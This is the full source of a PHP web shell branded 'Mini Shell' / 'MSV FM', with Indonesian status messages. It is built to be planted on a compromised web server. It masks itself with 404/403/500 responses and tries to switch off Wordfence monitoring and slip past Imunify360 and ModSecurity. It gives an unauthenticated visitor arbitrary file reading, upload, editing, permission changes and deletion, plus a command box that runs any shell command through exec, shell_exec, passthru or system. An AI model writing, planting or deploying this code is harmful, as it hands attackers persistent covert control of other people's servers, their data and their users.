<?php

/* 
Mini Shell
Author: msverse.site
Homepage: https://www.msverse.site
*/

error_reporting(0);
http_response_code(404);
ini_set('max_execution_time', 0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(500);

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}

if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
?>

<!DOCTYPE HTML>
<html lang="en">

<head>
    <link href="" rel="stylesheet" type="text/css">
    <title>MSV FM</title>
    <style>
        body {
             font-family: "arial", cursive;
             background-color: white; 
             color: #333; 
        }
        
        .container {
            max-width: 600px;
            margin: 5px auto;
            padding: 5px;
            border: 1px dotted #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            position: relative;
        }               
    
        #content tr:hover {
             background-color: #87CEEB; 
             color: #fff; 
             text-shadow: 0px 0px 10px #ffffff;
        }
    
        #content .first {
             background-color: #87CEEB;
             color: #fff; 
        }
    
        table {
             border: 1px #000000 dotted;
        }
    
        a {
             color: #333; 
             text-decoration: none;
        }
    
        a:hover {
            color: #87CEEB; 
            text-shadow: 0px 0px 10px #ffffff;
        }
    
        input,
        select,
        textarea {
            border: 1px #000000 solid;
            -moz-border-radius: 5px;
            -webkit-border-radius: 5px;
            border-radius: 5px;
        }
    </style>    
</head>

<body>
    <h1><center><font color="#87CEEB">MSV FM</font></center></h1>
    <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
        <tr>
            <td><font color="black">Path :</font>
                <?php
                if (isset($_GET['path'])) {
                    $path = $_GET['path'];
                } else {
                    $path = getcwd();
                }
                $path = str_replace('\\', '/', $path);
                $paths = explode('/', $path);

                foreach ($paths as $id => $pat) {
                    if ($pat == '' && $id == 0) {
                        $a = true;
                        echo '<a href="?path=/">/</a>';
                        continue;
                    }
                    if ($pat == '') continue;
                    echo '<a href="?path=';
                    for ($i = 0; $i <= $id; $i++) {
                        echo "$paths[$i]";
                        if ($i != $id) echo "/";
                    }
                    echo '">'.$pat.'</a>/';
                }
                ?>
            </td>
        </tr>
        <tr>
            <td>
                <?php
                if (isset($_FILES['file'])) {
                    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
                        echo '<font color="green">Upload Berhasil</font><br />';
                    } else {
                        echo '<font color="red">Upload Gagal</font><br/>';
                    }
                }
                ?>
                <form enctype="multipart/form-data" method="POST">
                    <font color="black">File Upload :</font> <input type="file" name="file" />
                    <input type="submit" value="upload" />
                </form>
            </td>
        </tr>
        <?php
        if (isset($_GET['filesrc'])) {
            echo "<tr><td>Current < : ";
            echo $_GET['filesrc'];
            echo '</tr></td></table><br />';
            echo ('<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>');
        } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
            echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
            if ($_POST['opt'] == 'chmod') {
                if (isset($_POST['perm'])) {
                    if (chmod($_POST['path'], octdec($_POST['perm']))) {
                        echo '<font color="green">Change Permission Berhasil</font><br/>';
                    } else {
                        echo '<font color="red">Change Permission Gagal</font><br />';
                    }
                }
                echo '<form method="POST">
                    Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
                    <input type="hidden" name="path" value="' . $_POST['path'] . '">
                    <input type="hidden" name="opt" value="chmod">
                    <input type="submit" value="Go" />
                </form>';
            } elseif ($_POST['opt'] == 'rename') {
                if (isset($_POST['newname'])) {
                    if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                        echo '<font color="green">Ganti Nama Berhasil</font><br/>';
                    } else {
                        echo '<font color="red">Ganti Nama Gagal</font><br />';
                    }
                    $_POST['name'] = $_POST['newname'];
                }
                echo '<form method="POST">
                    New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
                    <input type="hidden" name="path" value="' . $_POST['path'] . '">
                    <input type="hidden" name="opt" value="rename">
                    <input type="submit" value="Go" />
                </form>';
            } elseif ($_POST['opt'] == 'edit') {
                if (isset($_POST['src'])) {
                    $fp = fopen($_POST['path'], 'w');
                    if (fwrite($fp, $_POST['src'])) {
                        echo '<font color="green">Berhasil Edit File</font><br/>';
                    } else {
                        echo '<font color="red">Gagal Edit File</font><br/>';
                    }
                    fclose($fp);
                }
                echo '<form method="POST">
                    <textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
                    <input type="hidden" name="path" value="' . $_POST['path'] . '">
                    <input type="hidden" name="opt" value="edit">
                    <input type="submit" value="Save" />
                </form>';
            }
            echo '</center>';
        } else {
            echo '</table><br/>
                <center>';
            if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
                if ($_POST['type'] == 'dir') {
                    if (rmdir($_POST['path'])) {
                        echo '<font color="green">Directory Terhapus</font><br/>';
                    } else {
                        echo '<font color="red">Directory Gagal Terhapus</font><br/>';
                    }
                } elseif ($_POST['type'] == 'file') {
                    if (unlink($_POST['path'])) {
                        echo '<font color="green">File Terhapus</font><br/>';
                    } else {
                        echo '<font color="red">File Gagal Dihapus</font><br/>';
                    }
                }
            }
            echo '</center>';
            $scandir = scandir($path);
            echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
            <tr class="first">
                <td><center>Name</center></td>
                <td><center>Size</center></td>
                <td><center>Permission</center></td>
                <td><center>Modify</center></td>
            </tr>';

            foreach ($scandir as $dir) {
                if (!is_dir($path . '/' . $dir) || $dir == '.' || $dir == '..') continue;
                echo '<tr>
                    <td><a href="?path=' . $path . '/' . $dir . '">' . $dir . '</a></td>
                    <td><center>--</center></td>
                    <td><center>';
                if (is_writable($path . '/' . $dir)) echo '<font color="green">';
                elseif (!is_readable($path . '/' . $dir)) echo '<font color="red">';
                echo getPermissions($path . '/' . $dir);
                if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) echo '</font>';

                echo '</center></td>
                    <td><center><form method="POST" action="?option&path=' . $path . '">
                        <select name="opt">
                            <option value="">Select</option>
                            <option value="delete">Delete</option>
                            <option value="chmod">Chmod</option>
                            <option value="rename">Rename</option>
                        </select>
                        <input type="hidden" name="type" value="dir">
                        <input type="hidden" name="name" value="' . $dir . '">
                        <input type="hidden" name="path" value="' . $path . '/' . $dir . '">
                        <input type="submit" value=">">
                    </form></center></td>
                </tr>';
            }
            echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
            foreach ($scandir as $file) {
                if (!is_file($path . '/' . $file)) continue;
                $size = filesize($path . '/' . $file) / 1024;
                $size = round($size, 3);
                if ($size >= 1024) {
                    $size = round($size / 1024, 2) . ' MB';
                } else {
                    $size = $size . ' KB';
                }

                echo '<tr>
                    <td><a href="?filesrc=' . $path . '/' . $file . '&path=' . $path . '">' . $file . '</a></td>
                    <td><center>' . $size . '</center></td>
                    <td><center>';
                if (is_writable($path . '/' . $file)) echo '<font color="green">';
                elseif (!is_readable($path . '/' . $file)) echo '<font color="red">';
                echo getPermissions($path . '/' . $file);
                if (is_writable($path . '/' . $file) || !is_readable($path . '/' . $file)) echo '</font>';
                echo '</center></td>
                    <td><center><form method="POST" action="?option&path=' . $path . '">
                        <select name="opt">
                            <option value="">Select</option>
                            <option value="delete">Delete</option>
                            <option value="chmod">Chmod</option>
                            <option value="rename">Rename</option>
                            <option value="edit">Edit</option>
                        </select>
                        <input type="hidden" name="type" value="file">
                        <input type="hidden" name="name" value="' . $file . '">
                        <input type="hidden" name="path" value="' . $path . '/' . $file . '">
                        <input type="submit" value=">">
                    </form></center></td>
                </tr>';
            }
            echo '</table></div>';
        }
        ?>
<div class="container">
        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
            $cmdOutput = null;
            $cmd = $_POST['cmd'];
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $cmd = "cd " . escapeshellarg($path) . " && " . $cmd;
            if (function_exists('exec')) {
                @exec($cmd, $output, $returnVar);
                if ($returnVar === 0) {
                    $cmdOutput = implode("\n", $output);
                }
            } elseif (function_exists('shell_exec')) {
                $cmdOutput = @shell_exec($cmd);
            } elseif (function_exists('passthru')) {
                ob_start();
               @passthru($cmd, $returnVar);
                $cmdOutput = ob_get_clean();
            } elseif (function_exists('system')) {
                ob_start();
                @system($cmd, $returnVar);
                $cmdOutput = ob_get_clean();
            }
        }
        ?>
        <form method="POST" action="">
            <?php echo @get_current_user() . "@" . @gethostbyname($_SERVER['HTTP_HOST']) . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd' placeholder='Enter a command...'>
             <input type="submit" class="empty-button">
        </form>
</div>
<?php if (!empty($cmdOutput)) { ?>
    <div class="message-container">
        <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
    </div>
<?php } ?>
        <center><br /><footer style="text-align: center; margin-top: 20px; color: #333;">
        &copy; <a href="https://rebrand.ly/Tutorial-Termux" alt="Tutorial Termux">msverse.site 2024. All rights reserved.
        </a></footer>
        </center>
</body>

</html>
<?php
function getPermissions($file)
{
    $perms = fileperms($file);

    $info = '';

    // Owner
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? ($perms & 0x0800 ? 's' : 'x') : ($perms & 0x0800 ? 'S' : '-');

    // Group
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? ($perms & 0x0400 ? 's' : 'x') : ($perms & 0x0400 ? 'S' : '-');

    // World
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? ($perms & 0x0200 ? 't' : 'x') : ($perms & 0x0200 ? 'T' : '-');

    return $info;
}
?>